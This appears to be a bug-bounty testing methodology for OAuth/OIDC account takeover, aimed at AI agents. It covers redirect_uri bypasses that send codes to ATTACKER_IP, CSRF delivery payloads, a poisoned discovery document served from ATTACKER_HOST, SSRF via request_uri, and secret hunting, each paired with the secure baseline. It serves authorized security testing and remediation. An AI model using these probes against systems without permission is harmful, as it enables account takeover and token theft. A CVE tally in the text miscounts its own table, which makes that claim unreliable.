---
technology: OAuth 2.0 / OpenID Connect
kind: bug-bounty-methodology
audience: ai-agent
version: 0.2
last-refresh: "2026-11-19"
source: "rewritten from HackTricks (pentesting-web/oauth-to-account-takeover.md), CC BY-NC 4.0, accessed 2026-11-12; supplement: six2dez/pentest-book (enumeration/web/oauth-attacks.md, no license — rewritten with attribution), accessed 2026-11-13; Supplement 2 (2026-11-19) adds provider-specific redirect footguns, OIDC discovery poisoning, verified CVE table, CTF notes, and evidence-capture guidance, verified against primary advisories"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; Supplement 2 2026-11-19 verified against primary advisories (GHSA/NVD/JFrog); credit in source line"
---

Companion pages: [[oauth|OAuth 2.0 / OpenID Connect overview]] — the human introduction and target model. Tool reference notes live in the separate tools vault; the appendix below names tooling in prose only.

# OAuth / OIDC Account-Takeover Methodology

**In scope:** any target speaking OAuth 2.0 / OIDC in any of the four roles — relying party (client), authorization server / IdP, resource server, or a native/SPA public client. **Out of scope:** SAML and other SSO protocols; raw API-key schemes; anything without an authorization-code or token leg.

**Standing rules:** authorized programs only. Every probe below is single-digit request volume. Prove each class with your own two test accounts first; touch the victim path only through an account you control, and never exfiltrate more than the proof needs.

## 1. The takeover model in one page

Every OAuth deployment chains four artifacts: **identity → code → token → session**. Each handoff assumes a binding — code↔client, code↔redirect_uri, code↔verifier, token↔audience, session↔identity. A takeover is any handoff where the binding is absent or unenforced: the attacker supplies an artifact, or an artifact minted for someone else is accepted.

### Where the money is (triage order)

| # | Class | Broken binding | Typical severity |
|---|---|---|---|
| 1 | redirect_uri manipulation | code ↔ registered callback | Critical |
| 2 | account linking on email trust | session ↔ (iss, sub) | Critical |
| 3 | missing/unchecked state | callback ↔ initiating browser | High–Critical |
| 4 | ID token misvalidation (nonce/aud/iss) | token ↔ login / client | High–Critical |
| 5 | PKCE absent or downgraded | code ↔ verifier | High |
| 6 | implicit-flow token leakage | token ↔ back channel | High |
| 7 | code reuse / cross-client redemption | code ↔ client, single use | High |
| 8 | scope/consent bypass | token ↔ consented scope | Medium–High |
| 9 | tokens in URLs / Referer / storage | token ↔ secret handling | Medium–High |
| 10 | client_secret in public clients | token request ↔ confidential client | High (chains with code theft) |

Phase 0 maps the flow; Phases 1–8 walk the classes in payout order. Every later phase reuses Phase 0's map.

## Phase 0 — Map the flow first

Never mutate a parameter you have not seen in a live request. Ten minutes of mapping prevents reporting a redirect_uri "bypass" against a client that does not exist.

### 0.1 Pull the discovery documents

```bash
curl -s https://auth.example.com/.well-known/openid-configuration | jq .
curl -s https://auth.example.com/.well-known/oauth-authorization-server | jq .
```

Record verbatim: `authorization_endpoint`, `token_endpoint`, `userinfo_endpoint`, `jwks_uri`, `scopes_supported`, `response_types_supported`, `code_challenge_methods_supported` (want `S256`), `token_endpoint_auth_methods_supported` (contains `none` → public clients exist), and `registration_endpoint` (present and unauthenticated → Phase 1.5).

### 0.2 Walk one real login through the proxy

Drive a complete login of your test account with the proxy recording, and keep every leg. From the `/authorize` request extract: `client_id` (public identifier), every `redirect_uri` the app uses (web, mobile, and staging clients on the same IdP are separate rows), `response_type`, `response_mode`, the `scope` set, `state` (present? opaque or decodable?), `nonce`, and `code_challenge`/`code_challenge_method`. Decode anything base64-ish in `state` — JSON carrying return paths, emails, or tenant IDs is both an info leak and a predictability lead.

### 0.3 Deliverable — the flow map

| Field | Observed example | First hypothesis |
|---|---|---|
| redirect_uri | `https://app.example.com/auth/callback` | which matching tier? (Phase 1) |
| state | absent | login CSRF (Phase 2) |
| code_challenge | absent | code interception pays (Phase 3) |
| response_type | `id_token token` | implicit leakage (Phase 4) |
| session minting | after `email` match | email-trust takeover (Phase 5) |
| registration_endpoint | open `/register` | you become a client (Phase 1.5) |

## Phase 1 — redirect_uri manipulation

RFC 6749 §3.1.2: the authorization server redirects **only** to pre-registered URIs, matched as exact strings, and on mismatch must error *without redirecting the browser anywhere*. Every weaker comparison is the finding. Registered value used below: `https://app.example.com/auth/callback`.

### 1.1 The matching-tier ladder

Send each mutation as a complete `/authorize` URL in your own browser first; watch whether the IdP redirects (bad) or errors (good). `<attacker-host>` below means any host you control — use ATTACKER_IP when a raw IP works.

| Tier the AS implements | Probe | Secure behavior |
|---|---|---|
| none | `redirect_uri=http://ATTACKER_IP/cb` | 400, no redirect |
| host `contains()` | `https://app.example.com.<attacker-host>/cb` | 400, no redirect |
| host `endsWith()` | `https://evil-app.example.com/` (ends in `app.example.com`) | 400, no redirect |
| path prefix | `https://app.example.com/auth/callback/x` | 400 |
| no separator | `https://app.example.com/auth/callbackx` | 400 |
| directory pattern | `--path-as-is` on `…/auth/callback/../../../redir?next=http://ATTACKER_IP` | 400 |
| parser confusion | `…%2Fauth%2Fcallback` and `…%2e%2e%2f` encodings, `https://APP.example.com/…`, punycode homograph host | 400 |
| userinfo confusion | `https://app.example.com@ATTACKER_IP/cb` | 400 |
| URL-structure tricks | `https://ATTACKER_IP/cb#https://app.example.com/auth/callback`, `https://app.example.com\@ATTACKER_IP` | 400 |
| wildcard subdomain | `https://dangling.app.example.com/cb` after subdomain takeover | reject unregistered subdomains |
| scheme unchecked | `http://app.example.com/auth/callback`, custom app scheme | 400 |

The most common wild tiers are prefix/suffix checks without a separator requirement — `callbackx` and `anything-callback` both land. Prefix matches weaponize when the appended path is attacker-influenced content on the allowed host (user pages, upload namespaces) or an endpoint that redirects again. Even *exact* matching falls to that second hop: a callback handler redirecting on a `next`/`returnTo` parameter delivers the code off-origin.

### 1.2 Full PoC chain (any accepted mutation)

```text
1. GET https://auth.example.com/authorize?response_type=code
     &client_id=app_123&redirect_uri=<accepted-mutation>&scope=openid&state=x
     — your browser, your test account
2. Approve consent, then observe the response:
     Location: <your-endpoint>?code=CODE&state=x      # delivered — log it
3. Redeem immediately (codes expire fast):
     POST /token   Host: auth.example.com
     grant_type=authorization_code&code=CODE&redirect_uri=<same mutation>
       &client_id=app_123[&code_verifier=… | &client_secret=…]
Expected secure at step 2: HTTP 400 with an OAuth error and NO redirect.
Finding: any 302 whose Location carries the code to an endpoint you control.
```

### 1.3 The validation family beyond redirect_uri

The same loose-matching bugs surface in `post_logout_redirect_uri`, `client_uri`/`policy_uri`/`tos_uri` (rendered as links on consent pages), and `initiate_login_uri` (OIDC third-party-initiated login — an open value is a phishing launcher on a trusted domain).

### 1.4 Callback page bugs (when exact match holds)

The callback runs on a trusted origin and often reflects response parameters: mutate `error_description`/`message` with HTML and event-handler payloads (a Safari-only `onpagereveal` beats WAFs keyed on `onerror`), and decode `state` here too. Trusted-origin XSS on the callback is session theft during login — Critical.

### 1.5 Open dynamic client registration

If the metadata exposes `registration_endpoint` and `POST /register` needs no authentication, register your own client:

```bash
curl -s https://auth.example.com/register -H 'Content-Type: application/json' \
  -d '{"redirect_uris":["http://ATTACKER_IP/cb"],"client_name":"docs"}' | jq .
```

You are now a *legitimate* client — no redirect bypass needed; a code for your `client_id` arrives at your callback by design once the victim approves. PKCE does not defend here (you generated the challenge). Report as a configuration flaw: registration must require authentication or approval.

## Phase 2 — state: login CSRF and forced linking

`state` is the only thing binding the callback to the browser that started the flow. Missing, optional, unvalidated, predictable, or fixatable → you can complete *your* flow inside the *victim's* browser.

### 2.1 The delivery recipe

```text
1. Attacker account: run the flow to the final redirect. When the browser is
   about to GET  https://app.example.com/auth/callback?code=CODE&state=S1,
   drop it in the proxy and save the URL (the code must stay fresh).
2. Deliver it to the victim's browser:
   <img src="https://app.example.com/auth/callback?code=CODE&state=S1">
   (or iframe / auto-submitting form / plain link) — the victim's browser
   consumes YOUR pending flow.
```

Two outcomes, both reportable:

- **Login CSRF** — the victim lands in a session bound to the attacker's identity. Anything the victim then types into "their" account (notes, messages, cards) is readable by the attacker.
- **Forced linking (the payout)** — if the callback *links* the federated identity to the logged-in local account (or auto-links by email), the attacker's IdP identity is welded onto the victim's account. The attacker later signs in with that identity and owns the account — persistent, Critical.

### 2.2 Checks, in order

| Check | How | Secure | Finding |
|---|---|---|---|
| state absent | `/authorize` request has none | — | whole login is CSRFable |
| state optional | delete it from `/authorize` | AS refuses or client rejects callback | flow completes |
| state not compared | tamper one char in the callback | client aborts, no session | session minted |
| predictable | sequential / timestamp / base64 JSON | ≥128-bit random | forge and deliver |
| fixatable | supply your own `state`, reused across flows | server-generated per flow | known value locked in |

### 2.3 Code pair — callback handling

```python
# VULNERABLE — echoes state, never compares; links by email on top
data = json.loads(b64d(request.args["state"]))        # attacker-crafted
user = db.by_email(userinfo["email"]); login(user)

# SECURE — random at flow start, compared once; identity from iss+sub
if not compare_digest(session.pop("oauth_state", ""), request.args.get("state", "")):
    abort(400)                                        # CSRF dead
user = db.by_identity(claims["iss"], claims["sub"])    # Phase 5 binding
```

PKCE does not replace `state`: it binds the code to a verifier, not the callback to the browser. Public clients need both.

## Phase 3 — code interception and PKCE

PKCE (RFC 7636): the client sends `code_challenge=BASE64URL(SHA256(verifier))` in `/authorize` and the verifier at `/token`; the AS must reject every inconsistent combination. Absent PKCE plus any interception vector equals code theft and unassisted token minting.

### 3.1 Interception vectors — how you get a code at all

An accepted redirect mutation (Phase 1) · Referer leak off the callback page (Phase 8) · custom-scheme hijacking: any app on the device can register `com.example.app:` and receive the redirect (desktop handlers too) · proxy/server logs of callback URLs · postMessage gadgets that echo `location` cross-origin.

### 3.2 The downgrade matrix

Run every cell with two test accounts. Each inconsistent cell must fail at `/token` with `invalid_grant`.

| `/authorize` sent | `/token` sends | Verdict if 200 + token |
|---|---|---|
| `code_challenge` (S256) | matching verifier | baseline — correct |
| `code_challenge` (S256) | no verifier | PKCE not enforced |
| `code_challenge` (S256) | wrong verifier | verifier ignored |
| nothing (stripped by you) | any verifier | AS forgot the challenge — code is injectable |
| `code_challenge_method=plain` | verifier | S256 not required |

The stripped-challenge row is the modern bug: the AS accepts a verifier for a code that never had a challenge, so an attacker-started, challenge-free code can be injected into a victim's pending PKCE flow.

### 3.3 Code hygiene — four requests, same phase

```bash
# a) replay: redeem CODE twice       -> second MUST be 400 and revoke prior tokens
# b) age: redeem after 10 min; c) race: two parallel redemptions -> one 200
# d) cross-client: redeem app A's code using app B's client_id -> must fail
curl -s https://auth.example.com/token \
  -d 'grant_type=authorization_code' -d "code=$CODE" \
  -d 'client_id=app_mobile' -d "redirect_uri=$RU"
```

## Phase 4 — implicit flow and token leakage

`response_type=token` (and `id_token token`) delivers bearer tokens through the browser. RFC 9700 retires it; production keeps it.

### 4.1 Fingerprint

The `/authorize` request asks for `response_type=token` · the callback URL contains `#access_token=` / `#id_token=` (fragment) or `?access_token=` (query — strictly worse: Referer carries it to every third-party subresource).

### 4.2 Why the fragment is not safe

Fragments stay out of the Referer header — that is the entire defense. But the full URL lands in browser history; every script on the callback origin reads `location.href` (analytics, chat widgets, one XSS anywhere); SDKs forward the full URL to their backends; support and sharing flows copy-paste it.

### 4.3 Client confusion — token audience not checked

```text
1. Run your own app against the same IdP (client_id=attacker_app).
2. A victim logs into YOUR site with the IdP; you hold their token (audience: attacker_app).
3. Feed that token to the victim app's session/token-consumption endpoint.
   Secure: rejected — aud/client_id mismatch. Finding: a session is minted.
```

### 4.4 response_mode variants and silent flows

`query` puts the code/token in the query string (Referer exposure) · `form_post` auto-submits a POST (CSRF-relevant) · `web_message` postMessages the response to the opener — audit the listener's `origin` check. Add `prompt=none`: if the IdP mints tokens silently for an existing session, a hidden iframe plus a sloppy `web_message` listener harvests tokens from an attacker page with zero interaction.

## Phase 5 — account linking and email trust

The identity-binding phase: how the client turns "userinfo returned an email" into "this is account N".

### 5.1 Pre-account takeover (registration side)

```text
1. Register a local account victim-test@example.com and never verify the email.
2. From a second identity (an IdP account whose email IS victim-test@example.com),
   run the target's "Sign in with IdP".
3. Secure: the link is refused, or local email verification is demanded first.
   Finding: the federated identity auto-merges into the unverified pre-created account
   — the attacker keeps password access to everything the victim now stores there.
```

### 5.2 Email-trust login (the IdP supplies the email)

Variants: the IdP returns `email` for accounts that never verified it (omitting or under-setting `email_verified`); the email is mutable after signup (change your provider profile email to the victim's); or the RP matches on `email`/`preferred_username` instead of `iss`+`sub`. Test from both seats — with a lab IdP you control when the program allows pointing the RP at it, and against the real IdP's signup when it accepts unverified emails.

### 5.3 Code pair — the binding that ends the class

```python
# VULNERABLE — mutable, unverified, recyclable identifier decides the session
user = db.find_by_email(claims["email"]) or User(email=claims["email"])

# SECURE — the stable pair decides it; email is display data until verified
user = db.find_by_identity(claims["iss"], claims["sub"])
if claims.get("email_verified") is not True:
    require_local_verification()        # or refuse the auto-link outright
```

Test the merge path separately from signup: apps that reject new unverified users still silently merge into *existing* accounts on email match alone.

## Phase 6 — scope and consent bypass

### 6.1 Scope upgrade at the token endpoint

`scope` is not a token-endpoint parameter for the code grant. If the AS honors it anyway:

```bash
curl -s https://auth.example.com/token \
  -d 'grant_type=authorization_code' -d "code=$CODE" -d 'client_id=app_123' \
  -d 'client_secret=…' -d 'scope=openid profile admin api:read api:write'
# Secure: 400, or issued scopes ⊆ consented. Finding: 200 with a broader
# token — confirm the escalation with an admin API call.
```

### 6.2 The consent gate

Request a scope set *broader* than any previous consent: does `/authorize` re-prompt, or grant silently because a session cookie exists? Then add `prompt=none` on top — silent issuance of new scopes. Each silently-granted scope expansion is a finding; severity scales with what the new scope reaches.

### 6.3 Resource-server enforcement

With a token scoped `read`, hit write and admin endpoints — a signature-valid but scope-insufficient token must get 403. "Valid token = full access" is the RS-side finding; check `aud` there too (the server-side twin of Phase 4.3).

## Phase 7 — ID token misvalidation (OIDC)

The ID token is a JWT. Signature and header attacks — alg confusion, `alg:none`, key injection — are covered in [[jwt-bug-bounty]]; run that matrix against the RP wherever it accepts tokens. This phase is the OIDC *binding layer* on top of a correctly signed token:

| Claim | Binding it provides | Test | Secure | Finding |
|---|---|---|---|---|
| `nonce` | token ↔ this login attempt | run two flows; feed flow-1's token to flow-2's callback; tamper the nonce | reject | session minted (replay) |
| `aud` / `azp` | token ↔ this client | your other client's valid token at the target's callback | reject | session minted (cross-app) |
| `iss` | token ↔ the IdP that started the flow | complete provider B's flow at provider A's callback; tamper the `iss` response parameter | reject | mix-up — code sent to the wrong token endpoint |
| `email_verified` | email claim ↔ mailbox control | unverified-email login (Phase 5) | refuse link | takeover |
| `exp` / `iat` | token ↔ time | hour-old, otherwise valid token | reject | stale token accepted |

Multi-provider detail: the client must bind each pending flow to provider + exact issuer + client_id + redirect_uri + state + nonce + verifier, and consume it once. Global, provider-agnostic cookies for `state`/`nonce` are the modern variant — start provider A, complete provider B, and watch whose token endpoint receives the code.

## Phase 8 — token handling and storage

Possession is authorization (the Phase 0 model), so exposure handling *is* the attack surface.

- **Tokens in URLs:** grep proxy history and JS for `access_token=`, `?token=`, `#token=`. Query tokens ride Referer to every third-party subresource; fragment tokens ride history and `location.href` reads.
- **Referer leak of the code:** a callback page with `?code=` still in the URL loading analytics, fonts, or CDN assets sends the code off-origin. Check `Referrer-Policy` on the callback — `no-referrer` or `strict-origin-when-cross-origin` is the floor.
- **postMessage / telemetry SDKs** forwarding `location.href` to their backends; sometimes you can read those logs through your own app's SDK account.
- **Storage:** tokens in `localStorage`/`sessionStorage` are readable by every script on the origin (XSS amplifier); cookies must be `HttpOnly` + `Secure` + `SameSite`.
- **Refresh tokens:** redeem → RT2, replay RT1 → must fail *and* revoke the family (RT2 dead). A refresh token that survives logout is reportable. Race the same RT in parallel once.
- **Public-client secrets:** unpack the APK/IPA/Electron bundle and grep for `client_secret`, base64 JSON blobs, endpoints. A recovered secret plus any code theft (Phase 3) is unassisted token minting; public clients should prove themselves with PKCE only.

## Quick reference — one table, every verdict

| # | Test | Request shape | Secure | Finding |
|---|---|---|---|---|
| 1 | redirect suffix | `/authorize?…redirect_uri=https://app.example.com/auth/callbackx` | 400, no redirect | 302 `Location: …callbackx?code=` |
| 2 | host contains | `…redirect_uri=https://app.example.com.<attacker-host>/cb` | 400 | code delivered |
| 3 | traversal | `--path-as-is …/auth/callback/../../redir?next=http://ATTACKER_IP` | 400 | code delivered |
| 4 | drop state | remove `state` from `/authorize` | client rejects callback | login CSRF |
| 5 | tamper state | callback `?code=…&state=mutated` | abort, no session | session minted |
| 6 | strip PKCE | authorize without challenge, redeem with verifier | `invalid_grant` | 200 + token |
| 7 | code replay | redeem the same code twice | 400 + revoke | second 200 |
| 8 | cross-client | app A's code with app B's client_id at `/token` | 400 | 200 |
| 9 | implicit | `response_type=token` flow | AS refuses | `#access_token=` in URL |
| 10 | foreign token | your client's token at the target session endpoint | rejected | session minted |
| 11 | scope upgrade | extra `scope=` at `/token` | ignored / 400 | escalated token |
| 12 | silent scope grant | `/authorize` with new scope + `prompt=none` | consent shown | silent issuance |
| 13 | nonce replay | flow-1's ID token at flow-2's callback | reject | session minted |
| 14 | unverified email | IdP account with an unverified victim-style email | link refused | victim session |
| 15 | refresh replay | old refresh token at `/token` | 401 + family revoked | 200 + new tokens |
| 16 | open registration | `POST /register` with no auth | 401/403 | your client_id issued |

## Reporting

Lead with impact: every class above ends in "the attacker controls the victim's session — or the account, if the link persists." Put that in the title, then the broken binding, then the two-account PoC, one request per step. Severity rules of thumb: code/token delivery to attacker infrastructure, email-trust linking, forced account linking — Critical; login CSRF without persistence and PKCE downgrade that needs a second bug — High; scope escalation — the scope's reach; URL/history token exposure — Medium–High once you show the read path. For remediation, cite the RFC section (§3.1.2 exact match, `state`, PKCE RFC 7636, RFC 9700 retiring implicit, OIDC `iss`+`sub` binding) — naming the clause signals root cause to the triager.

## Appendix — tooling (prose; per-tool notes live in the tools vault)

- **Burp Suite is the instrument.** The flow is stateful and multi-leg, and no scanner replaces walking the legs by hand: proxy one complete login, then use Repeater to mutate exactly one variable per request — drop `state`, strip `code_challenge`, swap `redirect_uri` — and hold/drop requests to stage the CSRF delivery. Collaborator provides out-of-band proof that a mutation delivers the code to you; Match & Replace automates repeated mutations.
- **EvilGinx2 as an interception lab.** A reverse proxy that sits between a user and the real IdP, capturing credentials and the code/token exchange. Its bounty value is learning and demonstration: run it against your own lab IdP to see exactly which leg leaks what, and use it in authorized red teams to prove code-interception feasibility. Never point it at a target you lack written permission for — it is credential-phishing infrastructure by design.
- **jwt_tool** for ID and access tokens: decode, tamper claims (`nonce`, `aud`, `iss`), and test `alg:none` and key-confusion acceptance — the [[jwt-bug-bounty]] matrix applied to the RP's token endpoint.
- **mitmproxy** when the mutation ladder should be scripted: an addon rewrites `redirect_uri` across a replayed login, batch-testing the tiers without manual Repeater work.
- **curl + jq** for everything server-side: discovery documents, token redemptions, code replays, the PKCE matrix — Phase 3 runs entirely from the shell against captured parameters.
- **Mobile:** apktool / jadx unpack and grep APKs for `client_secret` and endpoints; Frida / objection hook the custom-scheme handler at runtime to demonstrate scheme-hijack code theft; Burp's mobile proxy covers the legs.
- **The honest gap:** no off-the-shelf scanner models multi-leg browser flows. Encode the tables above as a small driver over your two test accounts — start flow, mutate, complete, attempt redemption, log the verdict — and you own a private harness no scanner matches.

## References

- RFC 6749 — The OAuth 2.0 Authorization Framework (§3.1.2 exact redirect matching)
- RFC 7636 — Proof Key for Code Exchange (PKCE)
- RFC 9700 — OAuth 2.0 Security Best Current Practice (retires implicit, mandates PKCE for public clients, code binding rules)
- OpenID Connect Core 1.0 — ID token, nonce, `iss`+`sub`, `email_verified`
- RFC 9207 — `iss` authorization-response parameter (mix-up defense)

## Supplement (2026-11-13) — residual probes from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`enumeration/web/oauth-attacks.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first against the phases above: most of the source (endpoint discovery, redirect ladder, PKCE matrix, code hygiene, email-trust linking, refresh rotation, JWT header attacks) already lives here or in [[jwt-bug-bounty]]; what follows are the deltas only.

**S1. Three more redirect_uri ladder rungs.** Duplicate-parameter pollution — send `redirect_uri` twice (`…&redirect_uri=https://app.example.com/cb&redirect_uri=http://ATTACKER_IP/cb`): parsers that take the first for validation and the last for the redirect (or vice versa) deliver the code to you. `javascript:` and `data:` schemes where a scheme check exists but is naive. Loopback callbacks — `http://127.0.0.1/cb`, `http://[::1]:8080/cb`, and `localhost.<target-domain>` hostnames: native-app client registrations often allow loopback anywhere, and a web client accidentally matched against them gives any local process your code.

**S2. PKCE with a weak verifier.** RFC 7636 verifiers are 43–128 chars from `[A-Za-z0-9-._~]` — unguessable when generated correctly. The bug is clients that derive the verifier from something predictable (timestamp, username, a short PRNG seed): the challenge is then precomputable, so observe several of the client's own flows, reconstruct the generator, and mint challenges for candidate codes. Only worth a probe when the captured `code_challenge` values repeat or look structured.

**S3. Scope escalation at the REFRESH grant.** Phase 6.1 covers the code grant; the same test belongs on `grant_type=refresh_token` — POST an expanded `scope=` alongside a valid refresh token. RFC 6749 §6 permits narrowing only; any 200 whose token carries more scope than the original grant is the finding.

**S4. Client-authentication confusion.** Confidential clients authenticate at `/token` by Basic header OR POST body per deployment. Probe the matrix: secret in body when Basic is expected (and reverse), secret in the wrong parameter name, and the request entirely without the secret — some servers validate the method they expected and ignore the one you used, and a public-style (secret-less) redemption succeeding for a confidential client means client identity is not actually enforced.

**S5. Secret hunting beyond the app bundle.** Phase 8 unpacks APKs; the same `client_secret` surfaces in org-scoped GitHub/GitLab code search (`org:target "client_secret"`), CI variable listings in `.gitlab-ci.yml` history, docker image env blocks, and JS bundles. With a confidential client's secret alone, `grant_type=client_credentials` often mints tokens with NO user and NO code — the unassisted path Phase 8 implies, made explicit.

**S6. Tooling deltas.** oauth2c (cloudentity) drives an OAuth/OIDC flow from a CLI — fast metadata-driven probing of grant types and auth methods between your curl calls. For a lab IdP when a program lets you point the RP at infrastructure you control: Keycloak in docker (`docker run -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak start-dev`) issues real flows with attacker-controlled claims in minutes.

## Supplement 2 (2026-11-19) — provider footguns, discovery poisoning, verified CVEs, CTF notes

*Sources: Doyensec "Common OAuth Vulnerabilities" (2025-01-30); GHSA/NVD/JFrog primary advisories (each re-verified at write time, listed in References below); provider documentation. Diff-first against the phases above: this block adds the provider-specific comparison detail behind Phase 1, a discovery-document attack surface absent from Phase 0, a verified CVE table, the explicit token-substitution variant, an evidence-capture section, and a CTF lens. Nothing above was rewritten.*

### S2.1 Expected error JSON — the baselines you diff against

Before mutating anything, capture what a *correct* rejection looks like on this target so every finding is a diff, not a guess. RFC 6749 §5.2 defines token-endpoint errors as HTTP 400 with a JSON body; §4.1.2.1 defines authorization-endpoint errors as redirect-back query parameters — **except** when `redirect_uri` itself is missing or invalid, where the AS must *not* redirect and should render the error directly (that exception is the whole of Phase 1). RFC 7591 §3.2.2 defines registration errors.

```bash
# Token endpoint — a spent/invalid code. Secure baseline:
curl -s https://auth.example.com/token \
  -d grant_type=authorization_code -d code=already_used -d client_id=app_123 \
  -d redirect_uri=https://app.example.com/auth/callback
# -> HTTP 400  {"error":"invalid_grant","error_description":"..."}

# Wrong/absent client auth on a confidential client:
# -> HTTP 401  {"error":"invalid_client"}   (often with WWW-Authenticate: Basic)

# Bad redirect_uri at /authorize — MUST NOT redirect:
curl -si "https://auth.example.com/authorize?response_type=code&client_id=app_123&redirect_uri=http://ATTACKER_IP/cb&scope=openid&state=x"
# -> HTTP 400 (page rendered, no Location header)   SECURE
# -> HTTP 302 Location: http://ATTACKER_IP/cb?error=...   STILL A FINDING:
#    the error itself was delivered off-origin, proving the URI was honored
```

The error codes themselves are intelligence. `invalid_grant` on a code you never altered but `invalid_request` on a tampered one tells you which checks run in which order; a `invalid_scope` echoed back from `/token` on the code grant (where `scope` is not a valid parameter) is a live lead for Phase 6.1 before you even escalate.

### S2.2 Provider-specific redirect_uri matching (behind Phase 1)

Phase 1 tests the *ladder* of weak comparisons; this names the comparison each major IdP actually ships, because the productive mutation differs per provider. Verify against current provider docs before reporting — these behaviors are documented and stable but do drift.

| Provider | Documented matching | The productive probe |
|---|---|---|
| Google | Exact match of scheme+host+path; no wildcards, no fragments; `http://localhost` / `127.0.0.1` allowed on **any port** for "desktop/installed" client types | If the client type is installed, any local process can bind the loopback port and catch the code — chain with a malicious local app, not a redirect bypass |
| GitHub | Host+port must match exactly; the path need only be a **subdirectory** of the registered callback | Registered `/cb` accepts `/cb/anything` — find an open-redirect or attacker-content endpoint *under* that path (Phase 1.1 prefix rung, but documented, not a bug) |
| Keycloak | "Valid Redirect URIs" support `*` **wildcards** (e.g. `https://app.example.com/*`); loose patterns are common in the wild | A wildcard suffix plus a traversal/open-redirect on the allowed origin delivers the code; also probe `/*` matching encoded traversal |
| Microsoft Entra | Exact reply-URL match; redirect is tight — the Entra footgun is the **email claim**, not the URI (see nOAuth, S2.4) | Spend your budget on identity binding (Phase 5/7), not on URI mutation |
| Okta / Auth0 | Exact match by default; Auth0 permits wildcards only in a single `*` position with restrictions | Treat as exact-match targets: pivot to the callback-page bugs of Phase 1.4 and the second-hop `next=` open redirect |

The reusable rule: **determine the IdP first** (the `issuer` in discovery, the login UI, cookie names), then pick the Phase 1 rung that its documented comparison actually leaves open. Firing the whole ladder at Google wastes requests; firing exact-match probes at a wildcard Keycloak misses the finding.

### S2.3 OIDC discovery poisoning (new surface, behind Phase 0)

Phase 0 *reads* the discovery document. This tests what happens when an attacker *controls or influences* it. Two distinct bugs:

**(a) Client trusts an attacker-reachable discovery URL.** Clients that build the issuer/discovery URL from user or tenant input ("enter your company's SSO domain") will fetch `https://<input>/.well-known/openid-configuration` and then trust every endpoint inside it. A hostile document redirects `authorization_endpoint`, `token_endpoint`, and `jwks_uri` to attacker infrastructure — the client signs users in against the attacker's AS, or validates tokens against the attacker's keys. The 2025 **mcp-remote** RCE (CVE-2025-6514, affected `[0.0.5, 0.1.15]`, CVSS 9.6) is the extreme case: a malicious MCP server returned a crafted `authorization_endpoint` (PoC value `file:/c:/windows/system32/calc.exe`) and the client opened it unsanitized, yielding OS command execution. Anywhere a client opens, fetches, or templates a metadata-supplied URL without an allowlist is this class.

```bash
# Does the RP fetch discovery from client-controlled input?
# Point it at a host you control and watch for the well-known fetch:
curl -s "https://app.example.com/sso/start?domain=ATTACKER_HOST" -i
# then on ATTACKER_HOST, serve:
cat > openid-configuration <<'JSON'
{"issuer":"https://ATTACKER_HOST",
 "authorization_endpoint":"https://ATTACKER_HOST/authorize",
 "token_endpoint":"https://ATTACKER_HOST/token",
 "jwks_uri":"https://ATTACKER_HOST/jwks.json",
 "response_types_supported":["code"],
 "subject_types_supported":["public"],
 "id_token_signing_alg_values_supported":["RS256"]}
JSON
# A hit on /.well-known/openid-configuration from the RP = the RP trusts your metadata.
```

**(b) `jwks_uri` / `request_uri` as SSRF and key-injection vectors.** Even against a *legitimate* AS, `request_uri` (OIDC request-object-by-reference) and `jwks_uri` resolution make the server fetch a URL you supply. Where the AS accepts a per-request `request_uri`, point it at `http://169.254.169.254/` or an internal host — a classic SSRF with the AS as the fetcher. Where key material is ever taken from a request-supplied `jku`/`jwk`/`x5u` header, you are in the JOSE-header injection matrix (see [[jwt-bug-bounty]] and Supplement row S2 above). Secure behavior: `request_uri` schemes/hosts allowlisted or the feature disabled; signing keys only ever from the AS's own pre-published `jwks_uri`.

### S2.4 Verified advisory table (re-checked against primary sources)

Real, citable precedent for each class — use these as "this exact bug shipped in production" evidence in reports, and as version floors when source or dependency manifests are in scope. No invented CVEs; every row was verified at write time (References).

| Target / package | ID | Class (phase) | Mechanism | Fixed |
|---|---|---|---|---|
| `@cloudflare/workers-oauth-provider` < 0.0.5 | CVE-2025-4143 | redirect_uri (1) | `redirect_uri` checked at the token exchange but **not** at `/authorize`; exploitable where the app auto-approves re-auth for an already-consented client | 0.0.5 |
| oauth2-proxy < 5.1.1 | CVE-2020-11053 | open redirect (1/8) | redirect validation bypassed with **HTML-encoded whitespace** in the URL | 5.1.1 |
| oauth2-proxy < 5.0.0 | CVE-2020-5233 | open redirect (1) | malformed pattern `/\domain.com` not rejected | 5.0.0 |
| oauth2-proxy < 7.0.0 | CVE-2021-21291 | open redirect (1) | allowlist let a domain **ending in** an allowed-domain string pass (suffix match) | 7.0.0 |
| Microsoft Entra ID (config) | **nOAuth** (no CVE; Descope 2023-06, Semperis confirms persistence 2025) | email trust (5/7) | attacker tenant sets an arbitrary **unverified** `email`; RP matching on the `email` claim signs the attacker in as the victim. Mitigate by keying on `sub`+`iss`; optional `xms_edov` claim signals verification | config / default change |
| `better-auth` < 1.6.11 | CVE-2026-53516 | pre-account linking (5.1) | auto-link gate checks provider `email_verified` but never the **local** row's `emailVerified`; attacker pre-registers the victim's email unverified, victim's OAuth login binds to the attacker's row, a post-link step then flips local `emailVerified` to true | 1.6.11 |
| Authorizer | CVE-2026-35511 | pre-account linking (5.1) | OAuth callback links Google/GitHub to **any** existing account by email match, even when that account's email was never verified — zero-click ATO | patched |
| Trigger.dev | CVE-2026-73655 | email trust (5.2) | Google `email_verified` not checked during OAuth login; attacker binds their Google identity to a victim's account | patched |
| WordPress "Login with Google" ≤ 1.4.2 | CVE-2026-28185 | email trust (5.2) | plugin ignores the unverified-email flag → unauthenticated **administrator** takeover | > 1.4.2 |
| `mcp-remote` `[0.0.5, 0.1.15]` | CVE-2025-6514 | discovery poisoning (S2.3) | malicious AS metadata returns a crafted `authorization_endpoint`; client opens the URL unsanitized → OS command execution (CVSS 9.6) | upgrade past 0.1.15 (commit 607b226) |

The cluster to internalize: four of these ten are the *same* email-trust/linking bug (nOAuth, better-auth, Authorizer, Trigger.dev, WP-Google) shipping independently across 2023–2026. It is the single most reproduced OAuth account-takeover class in the wild — Phase 5 is where to spend time on any target that offers "Sign in with X."

### S2.5 Token substitution — low-privilege code redeemed at a high-privilege client

